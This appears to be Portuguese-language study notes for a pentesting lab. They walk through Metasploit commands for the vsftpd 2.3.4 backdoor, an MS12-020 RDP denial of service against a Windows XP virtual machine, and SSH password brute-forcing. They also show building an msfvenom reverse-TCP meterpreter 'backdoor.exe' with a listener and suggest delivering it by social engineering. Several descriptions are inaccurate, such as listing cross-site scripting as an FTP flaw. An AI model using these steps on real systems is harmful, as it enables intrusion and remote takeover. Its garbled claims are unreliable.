# Técnicas de Exploração de Vulnerabilidade

## Introdução
Neste documento, exploraremos diversas técnicas utilizadas para identificar e explorar vulnerabilidades em sistemas de computador. Essas técnicas são essenciais para profissionais de segurança cibernética que buscam proteger redes e sistemas contra ameaças potenciais.

## explorando falhas de FTP
O File Transfer Protocol (FTP) é um protocolo de rede usado para transferir arquivos entre um cliente e um servidor. No entanto, o FTP pode ser vulnerável a várias falhas de segurança, como autenticação fraca e transferência de dados não criptografada.

alguns exemplos de vulnerabilidades em FTP incluem: 
- autenticação anônima: não precisa ter usuário e senha.
- ataque transversal de diretório: permite que um invasor acesse diretórios fora do diretório raiz permitido.
- injeção de script cruzado: permite que um invasor injete scripts maliciosos em páginas web acessadas por outros usuários.
- dridex: malware que pode ser distribuído através de vulnerabilidades em servidores FTP mal configurados.

## metasploit
O Metasploit é uma ferramenta poderosa usada para testes de penetração e exploração de vulnerabilidades. Ele fornece um framework para desenvolver, testar e executar exploits contra sistemas vulneráveis. Algumas das funcionalidades do Metasploit incluem:
- msfconsole: uma interface de linha de comando para interagir com o Metasploit.
- msfweb: uma interface web para gerenciar e executar exploits.
- msfpayloads: módulos que geram payloads maliciosos para serem usados em ataques.
- msfcli: uma interface de linha de comando para interagir com o Metasploit.
- msflogdump: uma ferramenta para capturar e analisar tráfego de rede.

### payloads comuns do metasploit

modulos de payloads no Metasploit são classificados em três categorias principais:
- singles payloads: executam uma única ação, como abrir uma conexão reversa.
- stagers payloads: dividem o payload em duas partes:
  - payload inicial: estabelece a conexão com o atacante.
  - payload final: o código malicioso que será executado no sistema alvo.
- stages: componentes adicionais que são enviados após o payload inicial para fornecer funcionalidades adicionais, como meterpreter.

o meterpreter é um payload que funciona na memória do sistema alvo, permitindo que o invasor execute comandos e scripts sem deixar rastros no disco rígido.

- no kali linux, entrar no metasploit:
  - abrir o terminal
  - digitar `msfconsole`
  - pressionar enter
- no metasploit para procurar por exploits:
  - digitar `search [nome do serviço ou vulnerabilidade]`
  - no momento, vamos usar o vsftpd 2.3.4 que é um servidor FTP vulnerável.
> **obs**: caso queira mais informações sobre o exploit, digite `info [nome do exploit]`
 por exemplo: `info exploit/unix/ftp/vsftpd_234_backdoor`
- para usar o exploit, digite `use [nome do exploit]`
  - por exemplo: `use exploit/unix/ftp/vsftpd_234_backdoor`
- para configurar o exploit, digite `show options` para ver as opções disponíveis.
- configurar o endereço IP do alvo com o comando `set RHOST [ip do alvo]`
- configurar o payload com o comando `set PAYLOAD [nome do payload]`
  - por exemplo: `set PAYLOAD cmd/unix/interact`
- para executar o exploit, digite `exploit` ou `run`
- se o exploit for bem-sucedido, você terá acesso ao sistema alvo e poderá executar comandos remotamente. 
![](<../.img/Captura de tela de 2025-11-30 02-08-51.png>)

## ataque DOS no RDP
O Remote Desktop Protocol (RDP) é um protocolo proprietário desenvolvido pela Microsoft que permite a conexão remota a um computador através de uma interface gráfica. No entanto, o RDP pode ser vulnerável a ataques de negação de serviço (DoS), que visam sobrecarregar o sistema alvo, tornando-o indisponível para usuários legítimos.

os ataques DoS no RDP são uma forma de tentativas de exploração que visam acessar sistemas remotos através do protocolo RDP, explorando vulnerabilidades para usar privilégios elevados ou executar código malicioso.

forma de ataque DoS no RDP:
- envio de pacotes malformados: o invasor envia pacotes RDP especialmente criados que o sistema alvo não consegue processar corretamente, levando a falhas ou travamentos.
- exploração de vulnerabilidades conhecidas: o invasor aproveita falhas de segurança conhecidas no software RDP para causar interrupções no serviço.
- ataques de força bruta: o invasor tenta repetidamente adivinhar credenciais de login, o que pode sobrecarregar o sistema e causar lentidão ou falhas.

### tipos de ataques DoS no RDP
- calling into robinhood: explora uma vulnerabilidade no serviço RDP que pode levar a um travamento do sistema.
- SamSam ransomware: um tipo de ransomware que pode ser distribuído através de ataques DoS no RDP, criptografando arquivos no sistema alvo e exigindo um resgate para sua liberação.

### formas de proteção contra ataques DoS no RDP
- manter o software atualizado: garantir que o sistema operacional e o software RDP estejam sempre atualizados com os patches de segurança mais recentes.
- usar firewalls: configurar firewalls para limitar o acesso ao serviço RDP apenas a endereços IP confiáveis.
- implementar autenticação multifator: adicionar uma camada extra de segurança para o acesso remoto.
- monitorar logs de acesso: revisar regularmente os logs de acesso para identificar atividades suspeitas..

## ataque RDP no windows xp
- primeiro, instalar o Windows XP em uma máquina virtual.
- configurar o RDP no Windows XP:
  - clicar com o botão direito em "Meu Computador" e selecionar "painel de controle".
  - clicar em "Sistema" e depois na aba "Remoto".
  - marcar a opção "Permitir conexões remotas a este computador".
  - abrir o terminal do windows xp:
  - colocar o comando `ipconfig` para verificar o endereço IP do sistema.
  - anotar o endereço do IP.
- no kali linux, abrir o terminal e usar o msfconsole:
  - digitar `msfconsole` e pressionar enter.
- procurar por exploits relacionados ao RDP:
  - digitar `search rdp` e pressionar enter.
- selecionar um exploit adequado:
  - por exemplo: `use exploit/windows/dos/rdp/ms12_020_maxchannelids`
- configurar o exploit:
  - digitar `show options` para ver as opções disponíveis.
  - configurar o endereço IP do alvo com o comando `set RHOST [ip do windows xp]`
  - colocar run para executar o exploit.
- se o ataque for bem-sucedido, o sistema Windows XP pode travar ou reiniciar, demonstrando a vulnerabilidade do RDP a ataques DoS.

##  exploitando falhas de SSH
O Secure Shell (SSH) é um protocolo de rede usado para comunicação segura entre um cliente e um servidor. No entanto, o SSH pode ser vulnerável a várias falhas de segurança, como autenticação fraca e ataques de força bruta.

vamos explorar uma vulnerabilidade comum no SSH usando o Metasploit:
- abrir o terminal no kali linux e iniciar o msfconsole:
  - digitar `msfconsole` e pressionar enter.
- procurar por exploits relacionados ao SSH:
  - digitar `search ssh_login` e pressionar enter.
- selecionar o exploit adequado:
  - por exemplo: `use auxiliary/scanner/ssh/ssh_login`
- configurar o exploit:
  - digitar `show options` para ver as opções disponíveis.
  - configurar o endereço IP do alvo com o comando `set RHOSTS [ip do alvo]`
  - configurar uma wordlist com o comando `set PASS_FILE [caminho para a wordlist]`
  - configurar o nome de usuário com o comando `set USER_FILE [caminho para a lista de usuários]`
- para executar o exploit, digite `run`
- se o ataque for bem-sucedido, você poderá obter acesso ao sistema alvo através do SSH usando as credenciais descobertas.

## adicionando backdoors em executáveis
backdoor é uma brecha em qualquer malware que permite que um invasor acesse remotamente um sistema comprometido sem o conhecimento do usuário legítimo. Adicionar backdoors em executáveis é uma técnica comum usada por invasores para manter o acesso a sistemas comprometidos.

### tipos de backdoors
- spyware: software malicioso que coleta informações do sistema e as envia para o invasor.
- ransomware: software malicioso que criptografa arquivos no sistema alvo e exige um resgate para sua liberação.
- DDOS: software malicioso que pode ser usado para lançar ataques de negação de serviço distribuídos contra outros sistemas.
- cryptojacking: software malicioso que utiliza os recursos do sistema alvo para minerar criptomoedas sem o conhecimento do usuário.

### proteções contra backdoors
rotação de senhas: alterar regularmente as senhas de acesso ao sistema para dificultar o acesso não autorizado.
- uso de software antivírus: instalar e manter atualizado um software antivírus para detectar e remover backdoors conhecidos.
- monitoramento de rede: revisar regularmente o tráfego de rede para identificar atividades suspeitas.
- cautela ao baixar software: evitar baixar e instalar software de fontes não confiáveis.

### meterpreter como backdoor
o meterpreter é um payload do Metasploit que pode ser usado como um backdoor em sistemas comprometidos. Ele é executado na memória do sistema alvo, permitindo que o invasor execute comandos e scripts sem deixar rastros no disco rígido.
- para adicionar um backdoor usando o meterpreter:
  - abrir o terminal no kali linux e iniciar o msfconsole:
    - digitar `msfconsole` e pressionar enter.
  - criar um payload meterpreter:
    - digitar `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip do atacante] LPORT=[porta do atacante] -f exe -o backdoor.exe`
  - transferir o backdoor para o sistema alvo usando um método apropriado, como metasploit ou engenharia social.
  - configurar um listener no Metasploit para aguardar a conexão do backdoor:
    - digitar `use exploit/multi/handler`
    - configurar o payload com o comando `set PAYLOAD windows/meterpreter/reverse_tcp`
    - configurar o endereço IP do atacante com o comando `set LHOST [ip do atacante]`
    - configurar a porta do atacante com o comando `set LPORT [porta do atacante]`
    - iniciar o listener com o comando `exploit`
- quando o backdoor for executado no sistema alvo, ele se conectará ao listener do Metasploit, permitindo que o invasor controle remotamente o sistema comprometido.